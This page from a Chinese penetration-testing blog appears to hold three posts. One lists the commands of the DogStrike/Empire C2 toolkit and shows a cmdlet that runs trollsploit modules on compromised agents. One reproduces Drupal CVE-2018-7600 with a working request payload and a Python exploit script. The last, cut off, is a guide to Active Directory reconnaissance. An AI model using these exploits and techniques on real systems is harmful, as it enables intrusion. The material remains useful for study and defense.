<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Import Module (Also Imports EmpireStrike/PowerEmpire/CypherDog)</span><br><span class="line">Import-Module DogStrike2.13</span><br><span class="line"><span class="meta">#</span> List all commands</span><br><span class="line">gcm -Mod DogStrike2.13 | Get-Help | Select Name,Synopsis</span><br><span class="line">Name Synopsis</span><br><span class="line">---- --------</span><br><span class="line">Invoke-DogBark Add Speech to automations</span><br><span class="line">Invoke-DogBite Return Listener &amp; Session for input Agent</span><br><span class="line">Invoke-DogClock Check Agent last checkin time</span><br><span class="line">Invoke-DogElevate Elevate Agent via empire module</span><br><span class="line">Invoke-DogFetch Bulk Add Properties to Nodes</span><br><span class="line">Invoke-DogMap Map Empire Nodes in BloodHound Graph</span><br><span class="line">Invoke-DogPass Pass Agent to another Server/listener</span><br><span class="line">Invoke-DogSearch Search Empire Nodes only</span><br><span class="line">Invoke-DogSpawn Spawn agent via empire module</span><br><span class="line">Invoke-DogSpread Spread agent via WMI</span><br><span class="line">Invoke-DogWatch Map/Update Empire Agents (loopable)</span><br><span class="line">Invoke-DogWipe Remove Stale Agents/Nodes</span><br><span class="line"><span class="meta">#</span> Help for Specific Command</span><br><span class="line">Get-Help &lt;CommandName&gt; -full</span><br></pre></td></tr></table></figure>
<p>视频</p>
<p><a href="https://www.youtube.com/watch?v=IcbCYy7IiNE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=IcbCYy7IiNE</a></p>
<p><a href="https://www.youtube.com/watch?v=bDm1zR2W4w0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bDm1zR2W4w0</a></p>
<p><a href="https://www.youtube.com/watch?v=a4EtEY37ImQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=a4EtEY37ImQ</a></p>
<p>注意</p>
<p>导入DogStrike还会导入PowerEmpire + EmpireStrike和CypherDog。</p>
<p><strong>附录</strong></p>
<p>Dummy DIY Cmdlet - 多个目标的模块组合</p>
<p>CMDLET</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## CMDLET</span></span><br><span class="line"><span class="comment">&lt;# SHOW ME WHAT YOU GOT! #&gt;</span></span><br><span class="line"><span class="keyword">Function</span> Invoke-ShowMeWhatYouGot&#123;</span><br><span class="line"> [CmdletBinding()]</span><br><span class="line"> [Alias(<span class="string">'ShowMeWhatYouGot'</span>)]</span><br><span class="line"> <span class="keyword">Param</span>(</span><br><span class="line"> <span class="comment"># Agent Name (Accepts multiple &amp; Pipeline)</span></span><br><span class="line"> [parameter(Mandatory=<span class="literal">$true</span>,ValueFromPipeline=<span class="literal">$True</span>)][String[]]<span class="variable">$Agent</span>,</span><br><span class="line"> <span class="comment"># Path to Wallpaper (on Empire Server)</span></span><br><span class="line"> [Parameter(Mandatory=<span class="literal">$true</span>)][Alias(<span class="string">'Image'</span>)][String]<span class="variable">$ImagePath</span>,</span><br><span class="line"> <span class="comment"># Video URL (if other than Get-Schwifty)</span></span><br><span class="line"> [Parameter(Mandatory=<span class="literal">$false</span>)][String]<span class="variable">$VideoURL</span></span><br><span class="line"> )</span><br><span class="line"> <span class="keyword">Begin</span>&#123;&#125;</span><br><span class="line"> <span class="keyword">Process</span>&#123;</span><br><span class="line"> <span class="keyword">Foreach</span>(<span class="variable">$Agt</span> <span class="keyword">in</span> <span class="variable">$Agent</span>)&#123;</span><br><span class="line"> <span class="comment"># Set Target Agent</span></span><br><span class="line"> DogBite -Agent <span class="variable">$Agt</span> -Select</span><br><span class="line"> <span class="comment"># trollsploit/wallpaper</span></span><br><span class="line"> Module powershell/trollsploit/wallpaper</span><br><span class="line"> Option LocalImagePath <span class="variable">$ImagePath</span></span><br><span class="line"> Strike -Agent <span class="variable">$Agt</span> -Blind</span><br><span class="line"> <span class="comment"># trollsploit/get-swchifty</span></span><br><span class="line"> Module powershell/trollsploit/get_schwifty</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$VideoURL</span>)&#123;Option VideoURL <span class="variable">$VideoURL</span>&#125;</span><br><span class="line"> Strike -Agent <span class="variable">$Agt</span> -Blind</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">End</span>&#123;</span><br><span class="line"> <span class="comment"># Quote the Giant Head</span></span><br><span class="line"> DogBark <span class="string">"I Like what You Got... Good Job."</span> -Rate -<span class="number">3</span> -Async</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">## ACTION (All Agent Nodes)</span></span><br><span class="line"><span class="comment"># Shumshumschilpiddydah!</span></span><br><span class="line"><span class="variable">$Schwifty</span> = <span class="string">'/root/Pictures/wallpapers/Get-Schwifty.png'</span></span><br><span class="line">DogSearch -Agent | ShowMeWhatYouGot -Image <span class="variable">$Schwifty</span></span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/SadProcessor/EmpireDog" target="_blank" rel="noopener">https://github.com/SadProcessor/EmpireDog</a></p>
<p><a href="https://github.com/EmpireProject" target="_blank" rel="noopener">https://github.com/EmpireProject</a></p>
<p><a href="https://github.com/EmpireProject/Empire/wiki" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/wiki</a></p>
<p><a href="https://adaptiveempire.slack.com" target="_blank" rel="noopener">https://adaptiveempire.slack.com</a></p>
<p><a href="https://gitlab.com/carlos_perez/PowerEmpire" target="_blank" rel="noopener">https://gitlab.com/carlos_perez/PowerEmpire</a></p>
<p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></p>
<p><a href="https://github.com/BloodHoundAD/BloodHound/wiki" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound/wiki</a></p>
<p><a href="https://bloodhoundhq.slack.com" target="_blank" rel="noopener">https://bloodhoundhq.slack.com</a></p>
<p><a href="https://blog.cptjesus.com/posts/introtocypher" target="_blank" rel="noopener">https://blog.cptjesus.com/posts/introtocypher</a></p>
<p><a href="https://posts.specterops.io/" target="_blank" rel="noopener">https://posts.specterops.io/</a></p>
<p><a href="http://porterhau5.com/blog/" target="_blank" rel="noopener">http://porterhau5.com/blog/</a></p>
<p><a href="https://adsecurity.org/" target="_blank" rel="noopener">https://adsecurity.org/</a></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Drupal远程代码执行漏洞(CVE-2018-7600)"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/04/13/Drupal远程代码执行漏洞(CVE-2018-7600)/">Drupal远程代码执行漏洞CVE-2018-7600</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/04/13/Drupal远程代码执行漏洞(CVE-2018-7600)/" class="article-date">
	  <time datetime="2018-04-13T15:53:56.000Z" itemprop="datePublished">2018-04-13</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Drupal远程代码执行漏洞CVE-2018-7600"><a href="#Drupal远程代码执行漏洞CVE-2018-7600" class="headerlink" title="Drupal远程代码执行漏洞CVE-2018-7600"></a>Drupal远程代码执行漏洞CVE-2018-7600</h1><h2 id="0x00-漏洞分析"><a href="#0x00-漏洞分析" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p>12号国外大佬发了CVE-2018-7600的漏洞POC，CVE-2018-7600远程代码执行漏洞的原因是由于Drupal对表单的渲染。</p>
<p><code>buildform</code>用户可控，可以传入<code>mail[#post_render]</code>、<code>mail[#type]数组，</code>即用户注入。而后<code>uploadAjaxCallback</code>方法可解析上面的数组，<code>call_user_fun</code>对于对于部分<code>#</code>属性数组值处理，导致任意代码执行。当做元素解析。导致远程代码执行漏洞。</p>
<p>在Drupal中render方法里<code>#pre_render</code>在render之前操作数组，<code>#post_render</code>接收render的结果并在其添加包装，<code>#lazy_builder</code>用于在render过程的最后添加元素。</p>
<p>我们来调试 一下：</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180414/aiIJfk2BBg.png?imageslim" alt="mark"></p>
<p>如图可以看出 数组 成功变为元素解析。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180414/Ak6aJccKdA.png?imageslim" alt="mark"></p>
<p>这样我们就可以通过构造mail[#post_render]形式的数组进行攻击。</p>
<h2 id="0X01漏洞复现"><a href="#0X01漏洞复现" class="headerlink" title="0X01漏洞复现"></a>0X01漏洞复现</h2><p><strong>对于较新的版本。在本地复现成功：Drupal8.5.0，Drupal8.4.5，Drupal8.4.4，Drupal8.4.3；</strong> 通杀EXP！</p>
<p>安装 Drupal8.5.0：额Drupal 带翻译可以在线下载。</p>
<p><a href="https://ftp.drupal.org/files/projects/drupal-8.5.0.tar.gz" target="_blank" rel="noopener">https://ftp.drupal.org/files/projects/drupal-8.5.0.tar.gz</a></p>
<p>Drupal8.4.4</p>
<p><a href="https://ftp.drupal.org/files/projects/drupal-8.4.4.tar.gz" target="_blank" rel="noopener">https://ftp.drupal.org/files/projects/drupal-8.4.4.tar.gz</a></p>
<p>。。。 这样一看下载地址很清楚。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180413/hmIeacF69f.png?imageslim" alt="mark"></p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/drupal-8.5.0/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax</span><br></pre></td></tr></table></figure>
<p>post 内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;mail[a][#lazy_builder][0]&apos;: &apos;system&apos;,</span><br><span class="line">&apos;mail[a][#lazy_builder][1][]&apos;: &apos;whoami&apos;,</span><br><span class="line">&apos;form_id&apos;: &apos;user_register_form&apos;</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180414/DDbh1kilFh.png?imageslim" alt="mark"></p>
<p>Python 小脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/drupal-8.5.0/'</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">'mail[test][#lazy_builder][0]'</span>: <span class="string">'system'</span>,</span><br><span class="line">    <span class="string">'mail[test][#lazy_builder][1][]'</span>: <span class="string">'whoami'</span>,</span><br><span class="line">    <span class="string">'form_id'</span>: <span class="string">'user_register_form'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">target = url + <span class="string">'user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax'</span></span><br><span class="line">r = requests.post(target, data=payload, verify=<span class="keyword">False</span>)</span><br><span class="line">print(r.headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
<h4 id="本地-Drupal8-5-0-复现成功"><a href="#本地-Drupal8-5-0-复现成功" class="headerlink" title="本地 Drupal8.5.0 复现成功"></a>本地 Drupal8.5.0 复现成功</h4><p><img src="http://wfwewefw.yuxuni.cn/blog/180414/ChG2AhK1B1.png?imageslim" alt="mark"></p>
<h4 id="本地Drupal8-4-5-复现成功"><a href="#本地Drupal8-4-5-复现成功" class="headerlink" title="本地Drupal8.4.5 复现成功"></a>本地Drupal8.4.5 复现成功</h4><p><img src="http://wfwewefw.yuxuni.cn/blog/180414/fC5Jb5Bmg0.png?imageslim" alt="mark"></p>
<h4 id="本地Drupal8-4-4-复现成功"><a href="#本地Drupal8-4-4-复现成功" class="headerlink" title="本地Drupal8.4.4 复现成功"></a>本地Drupal8.4.4 复现成功</h4><p><img src="http://wfwewefw.yuxuni.cn/blog/180414/LfgeE8fhbI.png?imageslim" alt="mark"></p>
<h4 id="本地Drupal8-4-3复现成功"><a href="#本地Drupal8-4-3复现成功" class="headerlink" title="本地Drupal8.4.3复现成功"></a>本地Drupal8.4.3复现成功</h4><p><img src="http://wfwewefw.yuxuni.cn/blog/180414/KEce6hkfam.png?imageslim" alt="mark"></p>
<h2 id="0X02-参考"><a href="#0X02-参考" class="headerlink" title="0X02 参考"></a>0X02 参考</h2><p><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/" target="_blank" rel="noopener">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></p>
<p><a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">https://paper.seebug.org/567/</a> </p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-域内信息收集"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/04/11/域内信息收集/">域内信息收集</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/04/11/域内信息收集/" class="article-date">
	  <time datetime="2018-04-11T13:03:56.000Z" itemprop="datePublished">2018-04-11</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h1><blockquote>
<p>​    记录下域内信息收集的技巧总结</p>
</blockquote>
<h3 id="SRV记录（标明主机服务信息）"><a href="#SRV记录（标明主机服务信息）" class="headerlink" title="SRV记录（标明主机服务信息）"></a>SRV记录（标明主机服务信息）</h3><p>SRV是DNS中的一种资源记录。SRV记录用于<strong>将服务的名称映射到提供该服务的服务器的DNS计算机</strong>名称。</p>
<p>简单来说，它<strong>标明了哪台主机提供哪种服务的信息</strong>。</p>
<p>Windows域中的服务会注册下列格式的srv记录：</p>
<p>​     _Service._Protocol.DnsDomainName</p>
<p>在windows域中，活动目录的正常工作依赖于DNS。</p>
<p>活动目录服务器通过tcp协议提供LDAP服务，因此它注册的srv记录类似于：</p>
<p>​     _ldap._tcp.example.com</p>
<p>域控制器则会以下面的形式注册srv记录：</p>
<p>​    _Service._Protocol.DCType._msdcs.DomainName, 这里的DCType可以是dc(域控制器),gc(全局编录),pdc(主域控制器)等。</p>
<p>例如：_ldap._tcp.dc._msdcs.example.com</p>
<h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><p>nslookup是一种网络管理工具，用于查询域名系统（DNS）以获取域名或IP地址映射或任何其他特定的DNS记录。</p>
<p>域控制器会注册一个srv记录，因此可以通过使用nslookup来查询这个srv记录，定位域控制器。</p>
<p>交互式命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nslookup                             # 进入交互式界面</span><br><span class="line"></span><br><span class="line">set type=all                     # 设置记录类型，可以设置为srv</span><br><span class="line"></span><br><span class="line">ldap.tcp.dc._msdcs.exist.local    # 执行查询</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/181027/889FJF18ie.png?imageslim" alt="mark"></p>
<p>nslookup输出</p>
<p>nslookup</p>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">服务器:  UnKnown</span><br><span class="line"></span><br><span class="line">Address:  172.17.0.128</span><br><span class="line"></span><br><span class="line">ldap.tcp.dc._msdcs.exist.com  SRV service location:</span><br><span class="line"></span><br><span class="line">          priority       = 0</span><br><span class="line"></span><br><span class="line">          weight       = 100</span><br><span class="line"></span><br><span class="line">          port           = 389</span><br><span class="line"></span><br><span class="line">          svr hostname   = win-dc.example.com</span><br><span class="line"></span><br><span class="line">win-dc.example.com       internet address = 172.17.0.128               # 这里就是域控的地址</span><br></pre></td></tr></table></figure>
<h3 id="SPN-服务主体名称"><a href="#SPN-服务主体名称" class="headerlink" title="SPN(服务主体名称)"></a>SPN(服务主体名称)</h3><p>SPN全名服务主体名称，作用是对服务进行<strong>唯一的标识</strong>。</p>
<p>在windows域中，服务实例需要注册一个spn，这样才能使用kerberos身份验证。SPN的注册格式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServiceName/FQDN:&lt;port | servicename&gt;</span><br></pre></td></tr></table></figure>
<p>FQDN是指完全限定域名。它可以标识出主机的逻辑位置。FQDN的格式为：主机名.域名，例如，一台搭载webserver的服务器主机名为webserver，域名为example.com，则FQDN为<strong>webserver.example.com</strong></p>
<p>SPN扫描</p>
<p>​    在windows域环境中，spn扫描是发现服务最好的一种方式，因为spn扫描的原理是使用ldap来向域控查询，因此不需要扫描内网中的每一台主机，流量不仅较小而且也很正常（kerberos认证依赖spn）。</p>
<p>下列是一些spn服务名的示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TERMSERV   -  RDP</span><br><span class="line"></span><br><span class="line">HOST  -  主机</span><br><span class="line"></span><br><span class="line">VNC    -   VNC服务器</span><br><span class="line"></span><br><span class="line">MSSQL  -  sql  server</span><br></pre></td></tr></table></figure>
<p>更多的spn服务名称，可以参考：<a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener">https://adsecurity.org/?page_id=183</a></p>
<h4 id="Setspn使用"><a href="#Setspn使用" class="headerlink" title="Setspn使用"></a>Setspn使用</h4><p>Setspn.exe</p>
<p>Setspn是一款管理spn的命令行软件。我们可以用它来查看某台主机或账户的spn</p>
<p>示例：</p>
<p>查看netbios名称为DM1主机的spn</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn –L  DM1</span><br></pre></td></tr></table></figure>
<p>查看账户example的spn</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn –L example</span><br></pre></td></tr></table></figure>
<p>查看当前域中的所有spn</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn –T ＊  -Q  /</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\shackle&gt;Setspn</span><br><span class="line">缺少参数: accountname。</span><br><span class="line"></span><br><span class="line">用法: Setspn [modifiers switch] [accountname]</span><br><span class="line">  其中 "accountname" 可以是目标计算机或</span><br><span class="line">  用户帐户的名称或域\名称</span><br><span class="line"></span><br><span class="line">  编辑模式开关:</span><br><span class="line">   -R = 重置 HOST ServicePrincipalName</span><br><span class="line">    用法:   setspn -R accountname</span><br><span class="line">   -S = 验证不存在重复项之后，添加任意 SPN</span><br><span class="line">    用法:   setspn -S SPN accountname</span><br><span class="line">   -D = 删除任意 SPN</span><br><span class="line">    用法:   setspn -D SPN accountname</span><br><span class="line">   -L = 列出在目标帐户中注册的 SPN</span><br><span class="line">    用法:   setspn [-L] accountname</span><br><span class="line"></span><br><span class="line">  编辑模式修饰符:</span><br><span class="line">   -C = 指定 accountname 是计算机帐户</span><br><span class="line">   -U = 指定 accountname 是用户帐户</span><br><span class="line"></span><br><span class="line">    注意: -C 和 -U 具有排他性。如果两者均未指定，</span><br><span class="line">     则工具在存在此类计算机时将 accountname 解释为计算机名，</span><br><span class="line">     不存在时解释为用户名。</span><br><span class="line"></span><br><span class="line">  查询模式开关:</span><br><span class="line">   -Q = 查询 SPN 是否存在</span><br><span class="line">    用法:   setspn -Q SPN</span><br><span class="line">   -X = 搜索重复的 SPN</span><br><span class="line">    用法:   setspn -X</span><br><span class="line"></span><br><span class="line">    注意: 搜索重复项(尤其在林范围内)可能需要</span><br><span class="line">     较长的时间，并占用大量内存。 -Q 将在</span><br><span class="line">     每个目标域/林上执行。-X 将返回存在于所有目标中的</span><br><span class="line">     重复项。不要求 SPN 在各个林之间是唯一的，</span><br><span class="line">     但重复项可能会导致在跨林进行身份验证时</span><br><span class="line">     出现身份验证问题。</span><br><span class="line"></span><br><span class="line">  查询模式修饰符:</span><br><span class="line">   -P = 抑制控制台的进度，可在将输出重定向到</span><br><span class="line">    文件时或在无人参与脚本中使用时使用。</span><br><span class="line">    直到命令完成后，才会输出内容。</span><br><span class="line">   -F = 在林级别而不是域级别执行查询</span><br><span class="line">   -T = 在指定的域或林(同时使用 -F 时)上执行查询</span><br><span class="line">    用法:   setspn -T domain (开关和其他参数)</span><br><span class="line">     可以使用 "" 或 * 表示当前域或林。</span><br><span class="line"></span><br><span class="line">    注意: 可以将这些修饰符与 -S 开关一起使用，</span><br><span class="line">     以便在添加 SPN 之前指定应在何处执行重复检查。</span><br><span class="line">    注意: 可以多次指定 -T。</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">setspn -R daserver1</span><br><span class="line">   它将注册 SPN "HOST/daserver1" 和 "HOST/&#123;DNS of daserver1&#125;"</span><br><span class="line">setspn -S http/daserver daserver1</span><br><span class="line">   如果域中不存在 SPN "http/daserver"，</span><br><span class="line">    它将为计算机 "daserver1" 注册此类 SPN</span><br><span class="line">setspn -D http/daserver daserver1</span><br><span class="line">   它将删除计算机 "daserver1" 的 SPN "http/daserver"</span><br><span class="line">setspn -F -S http/daserver daserver1</span><br><span class="line">   如果林中不存在 SPN "http/daserver"，</span><br><span class="line">    它将为计算机 "daserver1" 注册此类 SPN</span><br><span class="line">setspn -U -S http/daserver dauser</span><br><span class="line">   如果域中不存在 SPN "http/daserver"，</span><br><span class="line">     它将为用户帐户 "dauser" 注册此类 SPN</span><br><span class="line">setspn -T * -T bar -X</span><br><span class="line">   它将报告此域和 bar 中的所有重复 SPN 注册</span><br><span class="line">setspn -T bar -F -Q */daserver</span><br><span class="line">   它将查找在 bar 所属的林中以 */daserver 形式</span><br><span class="line">    注册的所有 SPN</span><br></pre></td></tr></table></figure>
<h3 id="Netview使用（收集域内主机共享、ip、是否为域控等信息）"><a href="#Netview使用（收集域内主机共享、ip、是否为域控等信息）" class="headerlink" title="Netview使用（收集域内主机共享、ip、是否为域控等信息）"></a>Netview使用（收集域内主机共享、ip、是否为域控等信息）</h3><p>Netview.exe</p>
<p>Netview 能够收集域内主机共享、ip、是否为域控等信息。</p>
<p>Github项目地址：<a href="https://github.com/mubix/netview" target="_blank" rel="noopener">https://github.com/mubix/netview</a></p>
<p>​    将主机名（或ip地址）列表保存在文件host.txt中，使用netview –f  host.txt来信息收集</p>
<p>Netsess.exe    </p>
<p>工具能够列举目标主机上的NetBIOS session，通常不依赖于管理员权限（-full参数列出所有会话需要管理权限）。</p>
<p>下载地址：<a href="http://www.joeware.net/freetools/tools/netsess/index.htm" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p>
<p>示例：</p>
<p>​    如果有一台域成员（192.168.1.128）机器net view了本机的共享（192.168.1.130），那么它与本机之间会存在一个netbios会话，可以使用下列命令来查看会话用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsess  -h  192.168.1.130  -c \192.168.1.128</span><br></pre></td></tr></table></figure>
<p>这里的-h参数指定了服务器的地址，-c参数则指定了客户端的地址 </p>
<h3 id="Nltest（测试域间的信任关系）"><a href="#Nltest（测试域间的信任关系）" class="headerlink" title="Nltest（测试域间的信任关系）"></a>Nltest（测试域间的信任关系）</h3><p>Nltest.exe</p>
<p><strong>Nltest可以用来测试域间的信任关系。</strong></p>
<p>示例：</p>
<p>Nltest /domain_trusts</p>
<p>输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List of domain trusts:</span><br><span class="line"></span><br><span class="line">    0: TURING turing.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: 0x20 )</span><br><span class="line"></span><br><span class="line">    1: SUBDOMAIN subdomain.turing.com (NT 5) (Forest: 0) (Primary Domain) (Native)</span><br></pre></td></tr></table></figure>
<p>Nltest.exe</p>
<p>以域A做参照域（Primary Domain），另一个域为域B。</p>
<p>①Direct Inbound（内传）</p>
<p>域B为信任域，域A为可信域。信任方向B -》A</p>
<p>②Direct Outbound（外传）</p>
<p>域A为信任域，域B为可信域。信任方向A -》 B</p>
<h3 id="ADFind（活动目录查询工具）"><a href="#ADFind（活动目录查询工具）" class="headerlink" title="ADFind（活动目录查询工具）"></a>ADFind（活动目录查询工具）</h3><p>Adfind是一款活动目录查询工具。</p>
<p>下载地址：<a href="http://www.joeware.net/freetools/tools/adfind/" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/adfind/</a></p>
<p>用户手册：<a href="http://www.joeware.net/freetools/tools/adfind/usage.htm" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/adfind/usage.htm</a></p>
<p>示例：</p>
<p>查询域中活动的主机,输出主机名和域名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind –sc computers_active name dnshostname</span><br></pre></td></tr></table></figure>
<p>列出域控列表</p>
